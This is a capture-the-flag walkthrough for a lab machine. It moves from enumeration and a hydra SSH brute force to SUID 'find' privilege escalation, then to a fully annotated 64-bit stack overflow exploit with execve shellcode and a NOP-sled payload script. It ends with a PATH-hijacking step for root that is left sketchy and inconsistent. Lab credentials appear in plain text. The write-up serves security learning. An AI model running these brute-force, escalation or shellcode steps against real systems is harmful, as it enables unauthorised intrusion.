# Binex — Buffer Overflow 64-bit CTF Writeup

## Objective

Read the file `flag.txt` from **kel**'s home directory by exploiting a 64-bit stack buffer overflow in the `bof` binary.

---

## 1. Reconnaissance

Full port scan and service enumeration:

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,139,445 $TARGET -oN service
```

**Key findings:** SSH on port 22, Samba on ports 139/445.

### Samba Enumeration

```bash
smbmap -u '' -p '' -H $TARGET
enum4linux -r $TARGET
```

Users discovered: `kel`, `des`, `tryhackme`, `noentry`

### SSH Brute Force

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
```

**Credentials found:** `tryhackme : thebest`

---

## 2. Privilege Escalation to `des`

### Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find
```

### Exploit `find` SUID (GTFOBins)

```bash
find . -exec /bin/sh -p \; -quit
cat /home/flag.txt
# username: des
# password: destructive_72656275696c64
```

SSH in as `des`:

```bash
ssh des@$TARGET
```

---

## 3. Buffer Overflow Analysis

### Vulnerable Source Code

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
    char buffer[600];        // Buffer allocated for 600 bytes
    int characters_read;
    printf("Enter some string:\n");
    characters_read = read(0, buffer, 1000);  // BUG: reads up to 1000 bytes!
    printf("You entered: %s", buffer);
    return 0;
}

void main(){
    setresuid(geteuid(), geteuid(), geteuid());
    setresgid(getegid(), getegid(), getegid());
    foo();
}
```

The vulnerability is clear: `buffer` is only 600 bytes, but `read()` accepts up to **1000 bytes** — allowing an attacker to overflow the stack and overwrite the return address.

### Verify ASLR is disabled

```bash
sysctl kernel.randomize_va_space
# kernel.randomize_va_space = 0
```

ASLR is off, meaning stack addresses are **fixed and predictable** across runs.

---

## 4. Finding the Offset (Steps 1–3)

### Step 1 — Generate a cyclic pattern

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
```

Paste the pattern as input to the binary inside GDB:

```bash
gdb ./bof
run
# paste pattern
```

### Step 2 — Read the RBP value after the crash

```
rbp = 0x4134754133754132
```

### Step 3 — Calculate the offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 0x4134754133754132
# [*] Exact match at offset 608
```

**Offset = 608 bytes**

---

## 5. Controlling the RIP (Step 4)

In 64-bit x86, the stack layout inside `foo()` is:

```
[ buffer: 608 bytes ] [ RBP: 8 bytes ] [ RIP: 8 bytes ] ...
```

Send a structured payload to confirm control:

```bash
run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
```

Inspect the stack:

```bash
x/4xg $rsp
# 0x7fffffffe498: 0x4343434343434343   <-- our C's are on the stack (RIP)
# 0x7fffffffe4a0: 0x0000000000000000
```

`RSP` points to `0x4343434343434343` — the **C's** we injected. This confirms we control the return address.

---

## 6. Finding the Return Address (Step 5)

Set a breakpoint at the `ret` instruction of `foo` and inspect the stack:

```bash
break *0x000055555555484e   # address of retq in foo
run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
print $rbp - 0x260          # RBP minus the buffer size = buffer start
# $2 = (void *) 0x7fffffffe230
```

The buffer starts at `0x7fffffffe230`. We aim the return address at the **middle of our NOP sled**, which lands us reliably inside the shellcode.

---

## 7. Building the Final Payload (Step 6)

### Payload structure

```
[ NOP sled ] [ shellcode ] [ junk padding ] [ saved RBP ] [ return address ]
```

- **NOP sled (`\x90`)** — a slide of no-operation instructions that gives us a wide landing target
- **Shellcode** — the code that spawns `/bin/sh`
- **Junk padding** — fills remaining bytes up to the saved RBP
- **Saved RBP** — 8 bytes of dummy data to overwrite the base pointer
- **Return address** — points back into the NOP sled so execution slides into the shellcode

### Annotated exploit script

```python
import struct

# -------------------------------------------------------------------------
# SHELLCODE — execve("/bin//sh", NULL, NULL) for x86-64 Linux
# This shellcode calls the execve syscall (syscall number 0x3b = 59)
# to spawn /bin/sh. It zeroes out rdx and rsi (envp and argv = NULL),
# pushes the string "/bin//sh" onto the stack, and triggers the syscall.
# -------------------------------------------------------------------------
shellcode = (
    b"\x50"                 # push rax               — save rax on stack
    b"\x48\x31\xd2"         # xor rdx, rdx           — rdx = NULL (envp)
    b"\x48\x31\xf6"         # xor rsi, rsi           — rsi = NULL (argv)
    b"\x48\xbb"             # mov rbx, <imm64>       — next 8 bytes go into rbx:
    b"\x2f\x62\x69\x6e"     #   "/bin"
    b"\x2f\x2f\x73\x68"     #   "//sh"               — rbx = 0x68732f2f6e69622f
    b"\x53"                 # push rbx               — push "/bin//sh" string onto stack
    b"\x54"                 # push rsp               — push pointer to the string
    b"\x5f"                 # pop rdi                — rdi = pointer to "/bin//sh" (1st arg)
    b"\xb0\x3b"             # mov al, 0x3b           — syscall number 59 (execve)
    b"\x0f\x05"             # syscall                — call execve("/bin//sh", NULL, NULL)
)

# -------------------------------------------------------------------------
# NOP SLED — 200 bytes of 0x90 (no-operation)
# The CPU slides through these harmlessly until it hits the shellcode.
# This gives us a large target window so minor address imprecision is OK.
# -------------------------------------------------------------------------
nop_sled = b"\x90" * 200

# -------------------------------------------------------------------------
# OFFSET — the number of bytes from the start of the buffer to saved RBP.
# Calculated with pattern_create.rb / pattern_offset.rb: 608 bytes.
# -------------------------------------------------------------------------
offset = 608

# -------------------------------------------------------------------------
# JUNK PADDING — fills the space between the shellcode and saved RBP.
# Total bytes before RBP = offset (608).
# We already used len(nop_sled) + len(shellcode) bytes, so pad the rest.
# -------------------------------------------------------------------------
junk = b"A" * (offset - len(nop_sled) - len(shellcode))

# -------------------------------------------------------------------------
# RBP PADDING — 8 bytes to overwrite the saved base pointer.
# We don't care what value goes here; we just need to get past it to RIP.
# -------------------------------------------------------------------------
rbp_pad = b"B" * 8

# -------------------------------------------------------------------------
# RETURN ADDRESS — overwrites the saved RIP on the stack.
# We aim 100 bytes past the start of the buffer so we land in the NOP sled,
# which then slides execution down into the shellcode.
#
# Buffer start (from GDB): 0x7fffffffe260  (outside GDB, no ASLR)
# +100 lands in the middle of the 200-byte NOP sled — safe landing zone.
#
# struct.pack("<Q", ...) encodes the address as a little-endian 64-bit value,
# which is the format the CPU expects on the stack.
# -------------------------------------------------------------------------
ret_addr = struct.pack("<Q", 0x7fffffffe260 + 100)

# -------------------------------------------------------------------------
# FINAL PAYLOAD ASSEMBLY
#
# Layout:
#   [  NOP sled (200)  ][  shellcode (24)  ][  junk (384)  ][  RBP (8)  ][  RIP (8)  ]
#   |<-------- 608 bytes (offset) -------->|               |<-- 8 -->|<---- 8 ---->|
# -------------------------------------------------------------------------
payload = nop_sled + shellcode + junk + rbp_pad + ret_addr

# Write the binary payload to a file for piping into the binary
with open("payload.bin", "wb") as f:
    f.write(payload)

# Summary
print(f"NOP sled:  {len(nop_sled)} bytes")
print(f"Shellcode: {len(shellcode)} bytes")
print(f"Junk:      {len(junk)} bytes")
print(f"RBP pad:   {len(rbp_pad)} bytes")
print(f"Ret addr:  {len(ret_addr)} bytes")
print(f"Total:     {len(payload)} bytes")
```

### Run the exploit

```bash
python3 buffer.py
(cat payload.bin; cat) | ./bof
```

The `cat` at the end keeps stdin open so you can type commands in the spawned shell.

## 8. Why It Works — Summary

| Component | Purpose |
|---|---|
| 608 bytes junk | Fills the stack buffer up to saved RBP |
| 8 bytes RBP pad | Overwrites saved base pointer (dummy value) |
| Return address | Overwrites saved RIP, redirects execution to our NOP sled |
| NOP sled (200×`\x90`) | Gives a large landing target for the return address |
| Shellcode | Calls `execve("/bin//sh")` to spawn a shell |

**Key conditions** that make this possible:
- **No stack canary** — nothing detects the overflow before `ret`
- **NX disabled** (`-z execstack`) — the stack is executable, so shellcode runs
- **ASLR = 0** — stack addresses are fixed and predictable
- **No PIE** — binary loads at a fixed address every time

### Read kel flag

```bash
Enter some string:
$ whoami
kel
$ cat /home/kel/flag.txt
THM{...}
username: kel
password: kelvin_74656d7065726174757265
```

---

## Priviesc to root

```bash
ls 
cat exe.c
```

**Output**
```
        setuid(0);
        setgid(0);
        system("ps");
```

### Te binary is vulnerable to path hijacking

### Execution
```bash
echo '/bin/bash' > ps
chmod +x ps
# change the path to a controlabe one
export PATH=/tmp:$PATH

```
